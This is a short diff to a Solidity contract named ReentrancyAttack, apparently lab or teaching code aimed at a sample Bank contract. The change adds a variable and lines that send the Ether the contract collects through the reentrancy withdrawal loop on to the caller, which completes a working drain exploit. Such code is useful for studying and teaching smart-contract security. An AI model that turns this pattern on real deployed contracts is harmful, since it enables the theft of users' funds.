@@ -37,6 +37,7 @@ contract ReentrancyAttack {
     // Declares a variable to hold the instance of the Bank contract.
     address payable bankAddress;
     uint public countWithdraw;
+    uint public attackerBalance;
 
     // @param _bankAddress The address of the Bank contract to attack.
     // Initializes the contract with the address of the target Bank contract.
@@ -64,8 +65,10 @@ contract ReentrancyAttack {
         Bank(bankAddress).deposit{value : 1 ether}();
         // Withdraws the Ether, triggering the receive function.
         Bank(bankAddress).withdraw();
-
         countWithdraw++;
+
+        attackerBalance = address(this).balance;
+        payable(msg.sender).transfer(attackerBalance);
     }
 
     // @notice Get the balance of Ether held by the attacking contract.
